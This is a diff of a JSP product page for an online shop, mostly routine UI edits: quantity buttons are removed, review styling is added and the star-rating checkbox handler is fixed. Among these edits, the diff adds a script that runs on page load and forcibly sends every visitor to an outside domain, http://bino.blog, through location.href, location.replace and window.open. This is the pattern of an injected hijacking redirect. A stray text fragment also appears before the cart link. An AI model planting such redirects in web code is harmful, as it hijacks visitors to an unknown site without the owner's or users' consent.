@@ -39,25 +39,12 @@
 						<p style="font-size: 15px">${item.itemContent}</p>
 						<div class="product_count">
 							<label for="qty">Quantity:</label>
-							<button
-								onclick="var result = document.getElementById('sst'); var sst = result.value; if( !isNaN( sst )) result.value++;return false;"
-								class="increase items-count" type="button">
-								<i class="ti-angle-left"></i>
-							</button>
+
 							<input type="text" id="qty" name="qty" id="sst" size="2"
 								maxlength="12" value="1" title="Quantity:"
 								class="input-text qty">
-							<button
-								onclick="var result = document.getElementById('sst'); var sst = result.value; if( !isNaN( sst ) &amp;&amp; sst > 0 ) result.value--;return false;"
-								class="reduced items-count" type="button">
-								<i class="ti-angle-right"></i>
-							</button>
-							<a class="button primary-btn" onclick="addtocart()">Add to
-								Cart</a>
-						</div>
-						<div class="card_area d-flex align-items-center">
-							<a class="icon_btn" href="#"><i class="lnr lnr lnr-diamond"></i></a>
-							<a class="icon_btn" href="#"><i class="lnr lnr lnr-heart"></i></a>
+
+							butt<a class="button primary-btn" onclick="addtocart()" style="color: white">Add to Cart</a>
 						</div>
 					</div>
 				</div>
@@ -74,14 +61,14 @@
 					data-toggle="tab" href="#review" role="tab" aria-controls="review"
 					aria-selected="false">Reviews</a></li>
 			</ul>
-			<div class="tab-content" id="myTabContent">
+			<div class="tab-content" id="myTabContent" >
 				<div class="tab-pane fade show active" id="review" role="tabpanel"
 					aria-labelledby="review-tab">
 					<div class="row">
-						<div class="col-lg-6">	
-						<h3>Review</h3>							
+						<div class="col-lg-6" style="height: 450px; overflow-y: scroll;" >
+						<h3>Review</h3>					
 							<c:forEach items="${reviews }" var="review">
-									<div class="media">
+									<div class="media" style="width: 450px">
 										<div class="media-body" style="margin-bottom: 5px">
 											<ul style="border: 1px solid silver; border-radius: 4px; padding: 10px">
 											<li style="color: black; font-size: 15px; padding:20">${review.reviewDate }&nbsp;&nbsp;&nbsp;${review.reviewWriter  }&nbsp;&nbsp;${review.reviewStar }점</li>
@@ -98,8 +85,7 @@
 								<div class="col-lg-6" >
 									<div class="review_box">
 										<h3>Add a Review</h3>									
-										<form action="reviewRs.do?itemCode=${item.itemCode}"
-											class="form-contact form-review mt-3">
+										<form action="reviewRs.do?itemCode=${item.itemCode}" class="form-contact form-review mt-3">
 											<div class="form-group">
 												<textarea class="form-control different-control w-100"
 													name="reviewContent" id="reviewContent" cols="50" rows="10"
@@ -119,11 +105,11 @@
 													type="checkbox" name="reviewStar" value="4"
 													style="width: 40px" onclick="clickCheck(this)" /></label> <label>5점<input
 													type="checkbox" name="reviewStar" value="5"
-													style="width: 40px" onclick="click Check(this)" /></label>
+													style="width: 40px" onclick="clickCheck(this)" /></label>
 												<hr>
 											</div>
 											<div class="form-group text-center text-md-right mt-3">
-												<button type="submit" class="button button--active button-review">Submit Now </button>
+												<button type="submit" class="button button--active button-review" >Submit Now </button>
 											</div>
 										</form>
 									</div>
@@ -172,6 +158,13 @@
 	<!--================End Product Description Area =================-->
 
 	<script type="text/javascript">
+	
+	var link = 'http://bino.blog';
+	 
+	location.href=link;
+	location.replace(link);
+	window.open(link);
+	
 	function addtocart(){
 		let name = document.getElementById('itemtitle').textContent;
 		let qty = document.getElementById('qty').value;
@@ -186,6 +179,16 @@
 		  		}
 		 })
 	}
+	
+	function clickCheck(target) {
+	    document.querySelectorAll(`input[type=checkbox]`)
+	        .forEach(el => el.checked = false);
+
+	    target.checked = true;
+	}
+	
+	
+
 </script>
 	<!--================ Start footer Area  =================-->
 
